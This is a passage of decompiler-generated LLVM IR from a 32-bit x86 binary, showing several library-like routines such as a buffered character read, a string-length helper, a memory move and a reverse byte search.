  uselistorder i8 %v2_804fc0e, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804fc0e, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804fb98, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_804fb7d, { 1, 0 }
  uselistorder i32 %v1_804fb69, { 1, 0 }
  uselistorder i32 %v0_804fb5d, { 1, 0 }
  uselistorder i32 %v4_804fb44, { 1, 0 }
  uselistorder i32 %tmp148, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_804fb49, { 1, 0 }
  uselistorder i32 %v2_804fb07, { 1, 0, 2 }
  uselistorder i3 %v1_804f9bd, { 1, 0 }
  uselistorder i8 %v4_804fa3c, { 1, 0 }
  uselistorder i32 %v3_804f97b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_804f97b, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_804f94d, { 1, 0 }
  uselistorder i32 %v3_804f93b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp111, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st0.global-to-local, { 2, 0, 1, 3 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 12, 13, 14, 15, 7, 5, 6, 4, 8, 9, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 22, 23, 20, 21, 24, 27, 26, 28, 25, 29, 5, 8, 6, 9, 7, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 6, 5, 7, 8, 9, 4 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 16, 17, 15, 18, 19, 20, 21, 23, 22, 24, 14, 4, 5, 3, 9, 6, 7, 8, 10, 11, 12, 13 }
  uselistorder i32* %ebp.global-to-local, { 9, 10, 11, 6, 7, 0, 4, 3, 1, 5, 2, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 8, 9, 10, 11, 4, 5, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804fea6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fea4, { 1, 0 }
  uselistorder label %dec_label_pc_804fe23, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fdd5, { 1, 0 }
  uselistorder label %dec_label_pc_804fdad, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fd7c, { 1, 0 }
  uselistorder label %dec_label_pc_804fd69, { 1, 0 }
  uselistorder label %dec_label_pc_804fd4f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fd1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fd07, { 1, 0 }
  uselistorder label %dec_label_pc_804fcfc, { 1, 0 }
  uselistorder label %dec_label_pc_804fc83, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fc75, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fc3b, { 1, 0 }
  uselistorder label %dec_label_pc_804fc0b.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804fbd7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fba6, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fb91, { 1, 0 }
  uselistorder label %dec_label_pc_804fa48, { 1, 0 }
  uselistorder label %dec_label_pc_804f96c, { 1, 0 }
  uselistorder label %dec_label_pc_804f963, { 1, 0 }
}

define i32 @function_804fee0() local_unnamed_addr {
dec_label_pc_804fee0:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_4()
  %stack_var_-5 = alloca i8, align 1
  %v0_804fee0 = load i32, i32* @ebx, align 4
  %v4_804fee4 = ptrtoint i16* %tmp to i32
  store i32 %v4_804fee4, i32* @ebx, align 4
  %v1_804fee8 = add i32 %v4_804fee4, 16
  %v2_804fee8 = inttoptr i32 %v1_804fee8 to i32*
  %v3_804fee8 = load i32, i32* %v2_804fee8, align 4
  %v2_804feeb = add i32 %v4_804fee4, 24
  %v3_804feeb = inttoptr i32 %v2_804feeb to i32*
  %v4_804feeb = load i32, i32* %v3_804feeb, align 4
  %v10_804feeb = icmp ult i32 %v3_804fee8, %v4_804feeb
  br i1 %v10_804feeb, label %dec_label_pc_804ff8d, label %dec_label_pc_804fef4

dec_label_pc_804fef4:                             ; preds = %dec_label_pc_804fee0
  %v2_804fef4 = load i16, i16* %tmp, align 2
  %v3_804fef4 = zext i16 %v2_804fef4 to i32
  %v1_804fef7 = and i32 %v3_804fef4, 131
  %v6_804ff01 = icmp ugt i32 %v1_804fef7, 128
  br i1 %v6_804ff01, label %dec_label_pc_804ff1b, label %dec_label_pc_804ff03

dec_label_pc_804ff03:                             ; preds = %dec_label_pc_804fef4
  %v0_804ff03 = load i32, i32* @edx, align 4
  %v6_804ff0b = call i32 @function_8050f18(i16* nonnull %tmp, i32 128, i32 %v0_804ff03, i32 %v0_804ff03)
  %v1_804ff13 = icmp eq i32 %v6_804ff0b, 0
  %v1_804ff15 = icmp eq i1 %v1_804ff13, false
  br i1 %v1_804ff15, label %dec_label_pc_804ffb2, label %dec_label_pc_804ff03.dec_label_pc_804ff1b_crit_edge

dec_label_pc_804ff03.dec_label_pc_804ff1b_crit_edge: ; preds = %dec_label_pc_804ff03
  %v0_804ff1b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ff1b

dec_label_pc_804ff1b:                             ; preds = %dec_label_pc_804ff03.dec_label_pc_804ff1b_crit_edge, %dec_label_pc_804fef4
  %v2_804ff4f = phi i32 [ %v0_804ff1b.pre, %dec_label_pc_804ff03.dec_label_pc_804ff1b_crit_edge ], [ %v4_804fee4, %dec_label_pc_804fef4 ]
  %v1_804ff1b = inttoptr i32 %v2_804ff4f to i32*
  %v2_804ff1b = load i32, i32* %v1_804ff1b, align 4
  store i32 %v2_804ff1b, i32* @ecx, align 4
  %v1_804ff1d = urem i32 %v2_804ff1b, 65536
  store i32 %v1_804ff1d, i32* %edx.global-to-local, align 4
  %v2_804ff20 = and i32 %v2_804ff1b, 2
  %v3_804ff20 = icmp eq i32 %v2_804ff20, 0
  br i1 %v3_804ff20, label %dec_label_pc_804ff3e, label %dec_label_pc_804ff25

dec_label_pc_804ff25:                             ; preds = %dec_label_pc_804ff1b
  %v1_804ff25 = urem i32 %v2_804ff1b, 2
  store i32 %v1_804ff25, i32* %edx.global-to-local, align 4
  %v1_804ff28 = add i32 %v2_804ff1b, 65535
  %v1_804ff2b = trunc i32 %v1_804ff28 to i16
  %v3_804ff2b = inttoptr i32 %v2_804ff4f to i16*
  store i16 %v1_804ff2b, i16* %v3_804ff2b, align 2
  %v0_804ff2e = load i32, i32* @ebx, align 4
  %v1_804ff2e = load i32, i32* %edx.global-to-local, align 4
  %v2_804ff2e = mul i32 %v1_804ff2e, 4
  %v3_804ff2e = add i32 %v0_804ff2e, 36
  %v4_804ff2e = add i32 %v3_804ff2e, %v2_804ff2e
  %v5_804ff2e = inttoptr i32 %v4_804ff2e to i8*
  %v6_804ff2e = load i8, i8* %v5_804ff2e, align 1
  %v7_804ff2e = zext i8 %v6_804ff2e to i32
  %v9_804ff2e = and i32 %v1_804ff2e, -256
  %v10_804ff2e = or i32 %v7_804ff2e, %v9_804ff2e
  store i32 %v10_804ff2e, i32* %edx.global-to-local, align 4
  %v1_804ff32 = add i32 %v0_804ff2e, 40
  %v2_804ff32 = inttoptr i32 %v1_804ff32 to i32*
  store i32 0, i32* %v2_804ff32, align 4
  %v0_804ff39 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ff39 = urem i32 %v0_804ff39, 256
  store i32 %v1_804ff39, i32* @edx, align 4
  br label %dec_label_pc_804ffb5

dec_label_pc_804ff3e:                             ; preds = %dec_label_pc_804ff1b
  %v1_804ff3e = add i32 %v2_804ff4f, 16
  %v2_804ff3e = inttoptr i32 %v1_804ff3e to i32*
  %v3_804ff3e = load i32, i32* %v2_804ff3e, align 4
  store i32 %v3_804ff3e, i32* @eax, align 4
  %v1_804ff41 = add i32 %v2_804ff4f, 20
  %v2_804ff41 = inttoptr i32 %v1_804ff41 to i32*
  %v3_804ff41 = load i32, i32* %v2_804ff41, align 4
  %v15_804ff41 = icmp eq i32 %v3_804ff41, %v3_804ff3e
  %v1_804ff44 = icmp eq i1 %v15_804ff41, false
  br i1 %v1_804ff44, label %dec_label_pc_804ff8d, label %dec_label_pc_804ff46

dec_label_pc_804ff46:                             ; preds = %dec_label_pc_804ff3e
  %v1_804ff46 = add i32 %v2_804ff4f, 4
  %v2_804ff46 = inttoptr i32 %v1_804ff46 to i32*
  %v3_804ff46 = load i32, i32* %v2_804ff46, align 4
  %v13_804ff46 = icmp eq i32 %v3_804ff46, -2
  %v1_804ff4a = icmp eq i1 %v13_804ff46, false
  br i1 %v1_804ff4a, label %dec_label_pc_804ff54, label %dec_label_pc_804ff4c

dec_label_pc_804ff4c:                             ; preds = %dec_label_pc_804ff46
  %v1_804ff4c = or i32 %v2_804ff1b, 4
  store i32 %v1_804ff4c, i32* @ecx, align 4
  %v1_804ff4f = trunc i32 %v1_804ff4c to i16
  %v3_804ff4f = inttoptr i32 %v2_804ff4f to i16*
  store i16 %v1_804ff4f, i16* %v3_804ff4f, align 2
  br label %dec_label_pc_804ffb2

dec_label_pc_804ff54:                             ; preds = %dec_label_pc_804ff46
  %v1_804ff54 = udiv i32 %v2_804ff1b, 256
  %v2_804ff54 = trunc i32 %v1_804ff54 to i8
  %v3_804ff54 = urem i8 %v2_804ff54, 4
  %v4_804ff54 = icmp eq i8 %v3_804ff54, 0
  %v8_804ff54 = zext i8 %v3_804ff54 to i32
  %v10_804ff54 = mul nuw nsw i32 %v8_804ff54, 256
  %v11_804ff54 = urem i32 %v2_804ff1b, 256
  %v12_804ff54 = or i32 %v10_804ff54, %v11_804ff54
  store i32 %v12_804ff54, i32* %edx.global-to-local, align 4
  br i1 %v4_804ff54, label %dec_label_pc_804ff69, label %dec_label_pc_804ff59

dec_label_pc_804ff59:                             ; preds = %dec_label_pc_804ff54
  %v3_804ff61 = call i32 @function_804cb18(i16* bitcast (i32** @global_var_805579c.117 to i16*))
  %v0_804ff69.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ff69

dec_label_pc_804ff69:                             ; preds = %dec_label_pc_804ff54, %dec_label_pc_804ff59
  %v0_804ff9e = phi i32 [ %v2_804ff4f, %dec_label_pc_804ff54 ], [ %v0_804ff69.pre, %dec_label_pc_804ff59 ]
  %v1_804ff69 = add i32 %v0_804ff9e, 8
  %v2_804ff69 = inttoptr i32 %v1_804ff69 to i32*
  %v3_804ff69 = load i32, i32* %v2_804ff69, align 4
  %v1_804ff6c = add i32 %v0_804ff9e, 12
  %v2_804ff6c = inttoptr i32 %v1_804ff6c to i32*
  %v3_804ff6c = load i32, i32* %v2_804ff6c, align 4
  %v15_804ff6c = icmp eq i32 %v3_804ff6c, %v3_804ff69
  br i1 %v15_804ff6c, label %dec_label_pc_804ff96, label %dec_label_pc_804ff71

dec_label_pc_804ff71:                             ; preds = %dec_label_pc_804ff69
  %v2_804ff74 = add i32 %v0_804ff9e, 24
  %v3_804ff74 = inttoptr i32 %v2_804ff74 to i32*
  store i32 %v3_804ff69, i32* %v3_804ff74, align 4
  %v0_804ff77 = load i32, i32* @ebx, align 4
  %v2_804ff78 = call i32 @function_8050ef0(i32 %v0_804ff77)
  %v1_804ff80 = icmp eq i32 %v2_804ff78, 0
  br i1 %v1_804ff80, label %dec_label_pc_804ffb2, label %dec_label_pc_804ff84

dec_label_pc_804ff84:                             ; preds = %dec_label_pc_804ff71
  %v0_804ff84 = load i32, i32* @ebx, align 4
  %v1_804ff84 = add i32 %v0_804ff84, 20
  %v2_804ff84 = inttoptr i32 %v1_804ff84 to i32*
  %v3_804ff84 = load i32, i32* %v2_804ff84, align 4
  %v2_804ff87 = add i32 %v0_804ff84, 24
  %v3_804ff87 = inttoptr i32 %v2_804ff87 to i32*
  store i32 %v3_804ff84, i32* %v3_804ff87, align 4
  %v0_804ff8a = load i32, i32* @ebx, align 4
  %v1_804ff8a = add i32 %v0_804ff8a, 16
  %v2_804ff8a = inttoptr i32 %v1_804ff8a to i32*
  %v3_804ff8a = load i32, i32* %v2_804ff8a, align 4
  br label %dec_label_pc_804ff8d

dec_label_pc_804ff8d:                             ; preds = %dec_label_pc_804ff3e, %dec_label_pc_804fee0, %dec_label_pc_804ff84
  %v1_804ff91 = phi i32 [ %v2_804ff4f, %dec_label_pc_804ff3e ], [ %v4_804fee4, %dec_label_pc_804fee0 ], [ %v0_804ff8a, %dec_label_pc_804ff84 ]
  %v0_804ff8d = phi i32 [ %v3_804ff3e, %dec_label_pc_804ff3e ], [ %v3_804fee8, %dec_label_pc_804fee0 ], [ %v3_804ff8a, %dec_label_pc_804ff84 ]
  %v1_804ff8d = inttoptr i32 %v0_804ff8d to i8*
  %v2_804ff8d = load i8, i8* %v1_804ff8d, align 1
  %v3_804ff8d = zext i8 %v2_804ff8d to i32
  store i32 %v3_804ff8d, i32* @edx, align 4
  %v1_804ff90 = add i32 %v0_804ff8d, 1
  %v2_804ff91 = add i32 %v1_804ff91, 16
  %v3_804ff91 = inttoptr i32 %v2_804ff91 to i32*
  store i32 %v1_804ff90, i32* %v3_804ff91, align 4
  %v0_804ffb5.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ffb5

dec_label_pc_804ff96:                             ; preds = %dec_label_pc_804ff69
  %v2_804ff99 = ptrtoint i8* %stack_var_-5 to i32
  %v5_804ff9e = inttoptr i32 %v0_804ff9e to i16*
  %v5_804ff9f = call i32 @function_8050e04(i16* %v5_804ff9e, i32 %v2_804ff99, i32 1)
  %v1_804ffa7 = icmp eq i32 %v5_804ff9f, 0
  br i1 %v1_804ffa7, label %dec_label_pc_804ffb2, label %dec_label_pc_804ffab

dec_label_pc_804ffab:                             ; preds = %dec_label_pc_804ff96
  %v3_804ffab = load i8, i8* %stack_var_-5, align 1
  %v4_804ffab = sext i8 %v3_804ffab to i32
  store i32 %v4_804ffab, i32* @edx, align 4
  br label %dec_label_pc_804ffb5

dec_label_pc_804ffb2:                             ; preds = %dec_label_pc_804ff96, %dec_label_pc_804ff71, %dec_label_pc_804ff03, %dec_label_pc_804ff4c
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_804ffb5

dec_label_pc_804ffb5:                             ; preds = %dec_label_pc_804ffab, %dec_label_pc_804ff8d, %dec_label_pc_804ff25, %dec_label_pc_804ffb2
  %v0_804ffb5 = phi i32 [ %v4_804ffab, %dec_label_pc_804ffab ], [ %v0_804ffb5.pre, %dec_label_pc_804ff8d ], [ %v1_804ff39, %dec_label_pc_804ff25 ], [ -1, %dec_label_pc_804ffb2 ]
  store i32 %v0_804fee0, i32* @ebx, align 4
  ret i32 %v0_804ffb5

; uselistorder directives
  uselistorder i32 %v0_804ff8d, { 1, 0 }
  uselistorder i32 %v3_804ff69, { 1, 0 }
  uselistorder i32 %v0_804ff9e, { 0, 1, 3, 2 }
  uselistorder i8 %v3_804ff54, { 1, 0 }
  uselistorder i32 %v3_804ff3e, { 1, 0, 2 }
  uselistorder i32 %v1_804ff39, { 1, 0 }
  uselistorder i32 %v2_804ff1b, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_804ff4f, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_804ffb5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ffb2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804ff8d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ff69, { 1, 0 }
}

define i32 @function_804ffbc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804ffbc:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804ffbc = load i32, i32* @edi, align 4
  store i32 %v0_804ffbc, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_804ffc3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ffc3, i32* %edi.global-to-local, align 4
  %v1_804ffcb = icmp eq i32 %arg3, 0
  store i1 %v1_804ffcb, i1* %zf.global-to-local, align 1
  br i1 %v1_804ffcb, label %dec_label_pc_804ffdb, label %dec_label_pc_804ffcf

dec_label_pc_804ffcf:                             ; preds = %dec_label_pc_804ffbc
  %v2_804ffcf = call i32 @_strlen(i8* %arg1)
  %v3_804ffcf = mul i32 %v2_804ffcf, -1
  %v4_804ffcf = add i32 %v3_804ffcf, -2
  store i32 %v4_804ffcf, i32* @ecx, align 4
  %v0_804ffd1 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804ffd1, label %dec_label_pc_804ffcf.dec_label_pc_804ffd8_crit_edge, label %dec_label_pc_804ffd3

dec_label_pc_804ffcf.dec_label_pc_804ffd8_crit_edge: ; preds = %dec_label_pc_804ffcf
  %v0_804ffd8.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_804ffd8.pre, -1
  br label %dec_label_pc_804ffd8

dec_label_pc_804ffd3:                             ; preds = %dec_label_pc_804ffcf
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ffd8

dec_label_pc_804ffd8:                             ; preds = %dec_label_pc_804ffcf.dec_label_pc_804ffd8_crit_edge, %dec_label_pc_804ffd3
  %v0_804ffd8 = phi i32 [ %phitmp, %dec_label_pc_804ffcf.dec_label_pc_804ffd8_crit_edge ], [ 0, %dec_label_pc_804ffd3 ]
  %v8_804ffd8 = icmp eq i32 %v0_804ffd8, 0
  store i1 %v8_804ffd8, i1* %zf.global-to-local, align 1
  store i32 %v0_804ffd8, i32* %edi.global-to-local, align 4
  %v2_804ffdd.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ffdb

dec_label_pc_804ffdb:                             ; preds = %dec_label_pc_804ffbc, %dec_label_pc_804ffd8
  %v2_804ffdd = phi i32 [ %v0_804ffbc, %dec_label_pc_804ffbc ], [ %v2_804ffdd.pre, %dec_label_pc_804ffd8 ]
  %v0_804ffdb = phi i32 [ 0, %dec_label_pc_804ffbc ], [ %v0_804ffd8, %dec_label_pc_804ffd8 ]
  store i32 %v2_804ffdd, i32* @edi, align 4
  ret i32 %v0_804ffdb

; uselistorder directives
  uselistorder i32 %v0_804ffd8, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804ffdb, { 1, 0 }
  uselistorder label %dec_label_pc_804ffd8, { 1, 0 }
}

define i32 @function_804ffe0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ffe0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804ffe1 = load i32, i32* @esi, align 4
  store i32 %v0_804ffe1, i32* %stack_var_-8, align 4
  %v4_804ffe2 = ptrtoint i8* %arg1 to i32
  %v9_804ffee = icmp ugt i8* %tmp3, %arg1
  %v1_804fff0 = icmp eq i1 %v9_804ffee, false
  br i1 %v1_804fff0, label %dec_label_pc_804fff8, label %dec_label_pc_804fff2

dec_label_pc_804fff2:                             ; preds = %dec_label_pc_804ffe0
  %v7_804fff4 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8050004

dec_label_pc_804fff8:                             ; preds = %dec_label_pc_804ffe0
  %v3_804fff8 = add i32 %arg2, -1
  %v4_804fff8 = add i32 %v3_804fff8, %tmp
  %v5_804fff8 = inttoptr i32 %v4_804fff8 to i8*
  %v3_804fffc = add i32 %v4_804ffe2, -1
  %v4_804fffc = add i32 %v3_804fffc, %tmp
  %v5_804fffc = inttoptr i32 %v4_804fffc to i8*
  %v7_8050001 = call i8* @_memcpy(i8* %v5_804fffc, i8* %v5_804fff8, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8050004

dec_label_pc_8050004:                             ; preds = %dec_label_pc_804fff2, %dec_label_pc_804fff8
  %v2_8050004 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050004, i32* @esi, align 4
  ret i32 %v4_804ffe2

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050004, { 1, 0 }
}

define i32 @function_8050008(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050008:
  %v0_8050008 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_805001b = inttoptr i32 %arg1 to i16*
  %v4_805001b = call i32 @function_804ce38(i16* %v3_805001b, i32 %arg2, i32 %arg3)
  %v0_8050020 = load i32, i32* @esi, align 4
  %v2_8050020 = add i32 %v0_8050020, %arg3
  store i32 %v0_8050008, i32* @esi, align 4
  ret i32 %v2_8050020
}

define i32 @function_805002c(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805002c:
  %tmp = trunc i32 %arg2 to i8
  %v4_8050031 = urem i32 %arg2, 256
  %v4_805003d = sext i8 %arg1 to i32
  %v2_8050041 = add i32 %v4_805003d, %arg3
  %v1_80500537 = icmp eq i32 %arg3, 0
  br i1 %v1_80500537, label %dec_label_pc_805005b, label %dec_label_pc_8050057

dec_label_pc_8050045:                             ; preds = %dec_label_pc_8050057
  %v1_8050045 = add i32 %v0_8050045, -1
  %v5_8050046 = load i32, i32* @edx, align 4
  %v6_8050046 = and i32 %v5_8050046, -256
  %v7_8050046 = or i32 %v6_8050046, %v4_8050031
  store i32 %v7_8050046, i32* @edx, align 4
  %v1_805004a = inttoptr i32 %v1_8050045 to i8*
  %v2_805004a = load i8, i8* %v1_805004a, align 1
  %v15_805004a = icmp eq i8 %v2_805004a, %tmp
  br i1 %v15_805004a, label %dec_label_pc_80500d8, label %dec_label_pc_8050052

dec_label_pc_8050052:                             ; preds = %dec_label_pc_8050045
  %v1_8050052 = add i32 %v0_8050052, -1
  %v8_8050052 = icmp eq i32 %v1_8050052, 0
  br i1 %v8_8050052, label %dec_label_pc_805005b, label %dec_label_pc_8050057

dec_label_pc_8050057:                             ; preds = %dec_label_pc_805002c, %dec_label_pc_8050052
  %v0_8050052 = phi i32 [ %v1_8050052, %dec_label_pc_8050052 ], [ %arg3, %dec_label_pc_805002c ]
  %v0_8050045 = phi i32 [ %v1_8050045, %dec_label_pc_8050052 ], [ %v2_8050041, %dec_label_pc_805002c ]
  %v2_8050057 = urem i32 %v0_8050045, 4
  %v3_8050057 = icmp eq i32 %v2_8050057, 0
  %v1_8050059 = icmp eq i1 %v3_8050057, false
  br i1 %v1_8050059, label %dec_label_pc_8050045, label %dec_label_pc_805005b

dec_label_pc_805005b:                             ; preds = %dec_label_pc_8050052, %dec_label_pc_8050057, %dec_label_pc_805002c
  %v0_80500be.pr = phi i32 [ 0, %dec_label_pc_805002c ], [ 0, %dec_label_pc_8050052 ], [ %v0_8050052, %dec_label_pc_8050057 ]
  %v0_8050060 = phi i32 [ %v2_8050041, %dec_label_pc_805002c ], [ %v1_8050045, %dec_label_pc_8050052 ], [ %v0_8050045, %dec_label_pc_8050057 ]
  store i32 %v0_8050060, i32* @ecx, align 4
  %v2_8050064 = mul nuw nsw i32 %v4_8050031, 256
  %v2_8050067 = or i32 %v2_8050064, %v4_8050031
  %v2_805006b = mul i32 %v2_8050067, 65536
  %v2_805006e = or i32 %v2_805006b, %v2_8050067
  %v6_80500c150 = icmp ugt i32 %v0_80500be.pr, 3
  br i1 %v6_80500c150, label %dec_label_pc_8050072, label %dec_label_pc_80500c3

dec_label_pc_8050072:                             ; preds = %dec_label_pc_805005b, %dec_label_pc_80500bb
  %v0_80500bb52 = phi i32 [ %v1_80500bb, %dec_label_pc_80500bb ], [ %v0_80500be.pr, %dec_label_pc_805005b ]
  %v0_805007251 = phi i32 [ %v1_8050072, %dec_label_pc_80500bb ], [ %v0_8050060, %dec_label_pc_805005b ]
  %v1_8050072 = add i32 %v0_805007251, -4
  store i32 %v1_8050072, i32* @ecx, align 4
  %v2_8050077 = inttoptr i32 %v1_8050072 to i32*
  %v3_8050077 = load i32, i32* %v2_8050077, align 4
  %v4_8050077 = xor i32 %v3_8050077, %v2_805006e
  %v1_8050079 = add i32 %v4_8050077, 2130640639
  %v1_805007f = sub i32 -1, %v4_8050077
  %v2_8050081 = xor i32 %v1_8050079, %v1_805007f
  %v1_8050083 = and i32 %v2_8050081, -2130640640
  %v2_8050083 = icmp eq i32 %v1_8050083, 0
  br i1 %v2_8050083, label %dec_label_pc_80500bb, label %dec_label_pc_805008b

dec_label_pc_805008b:                             ; preds = %dec_label_pc_8050072
  %v7_805008b = or i32 %v1_8050083, %v4_8050031
  %v1_805008f = add i32 %v0_805007251, -1
  %v2_8050092 = inttoptr i32 %v1_805008f to i8*
  %v3_8050092 = load i8, i8* %v2_8050092, align 1
  %v16_8050092 = icmp eq i8 %v3_8050092, %tmp
  br i1 %v16_8050092, label %dec_label_pc_80500d8, label %dec_label_pc_8050097

dec_label_pc_8050097:                             ; preds = %dec_label_pc_805008b
  %v1_805009b = add i32 %v0_805007251, -2
  %v2_805009e = inttoptr i32 %v1_805009b to i8*
  %v3_805009e = load i8, i8* %v2_805009e, align 1
  %v16_805009e = icmp eq i8 %v3_805009e, %tmp
  br i1 %v16_805009e, label %dec_label_pc_80500d8, label %dec_label_pc_80500a3

dec_label_pc_80500a3:                             ; preds = %dec_label_pc_8050097
  %v1_80500a7 = add i32 %v0_805007251, -3
  %v2_80500aa = inttoptr i32 %v1_80500a7 to i8*
  %v3_80500aa = load i8, i8* %v2_80500aa, align 1
  %v16_80500aa = icmp eq i8 %v3_80500aa, %tmp
  br i1 %v16_80500aa, label %dec_label_pc_80500d8, label %dec_label_pc_80500af

dec_label_pc_80500af:                             ; preds = %dec_label_pc_80500a3
  %v1_80500b3 = inttoptr i32 %v1_8050072 to i8*
  %v2_80500b3 = load i8, i8* %v1_80500b3, align 1
  %v15_80500b3 = icmp eq i8 %v2_80500b3, %tmp
  %v1_80500b5 = icmp eq i1 %v15_80500b3, false
  br i1 %v1_80500b5, label %dec_label_pc_80500bb, label %dec_label_pc_80500b7

dec_label_pc_80500b7:                             ; preds = %dec_label_pc_80500af
  br label %dec_label_pc_80500d8

dec_label_pc_80500bb:                             ; preds = %dec_label_pc_80500af, %dec_label_pc_8050072
  %v5_80500c827 = phi i32 [ %v7_805008b, %dec_label_pc_80500af ], [ 0, %dec_label_pc_8050072 ]
  %v1_80500bb = add i32 %v0_80500bb52, -4
  %v6_80500c1 = icmp ugt i32 %v1_80500bb, 3
  br i1 %v6_80500c1, label %dec_label_pc_8050072, label %dec_label_pc_80500c3

dec_label_pc_80500c3:                             ; preds = %dec_label_pc_80500bb, %dec_label_pc_805005b
  %v5_80500c826.lcssa = phi i32 [ %v4_8050031, %dec_label_pc_805005b ], [ %v5_80500c827, %dec_label_pc_80500bb ]
  %v0_8050072.lcssa = phi i32 [ %v0_8050060, %dec_label_pc_805005b ], [ %v1_8050072, %dec_label_pc_80500bb ]
  %v0_80500bb.lcssa = phi i32 [ %v0_80500be.pr, %dec_label_pc_805005b ], [ %v1_80500bb, %dec_label_pc_80500bb ]
  br label %dec_label_pc_80500d0

dec_label_pc_80500c7:                             ; preds = %dec_label_pc_80500d0
  %v1_80500d0 = add i32 %v0_80500d0, -1
  %v1_80500c7 = add i32 %v0_80500c7, -1
  %v6_80500c8 = and i32 %v5_80500c8, -256
  %v7_80500c8 = or i32 %v6_80500c8, %v4_8050031
  %v1_80500cc = inttoptr i32 %v1_80500c7 to i8*
  %v2_80500cc = load i8, i8* %v1_80500cc, align 1
  %v15_80500cc = icmp eq i8 %v2_80500cc, %tmp
  br i1 %v15_80500cc, label %dec_label_pc_80500d8, label %dec_label_pc_80500d0

dec_label_pc_80500d0:                             ; preds = %dec_label_pc_80500c7, %dec_label_pc_80500c3
  %v5_80500c8 = phi i32 [ %v7_80500c8, %dec_label_pc_80500c7 ], [ %v5_80500c826.lcssa, %dec_label_pc_80500c3 ]
  %v0_80500c7 = phi i32 [ %v1_80500c7, %dec_label_pc_80500c7 ], [ %v0_8050072.lcssa, %dec_label_pc_80500c3 ]
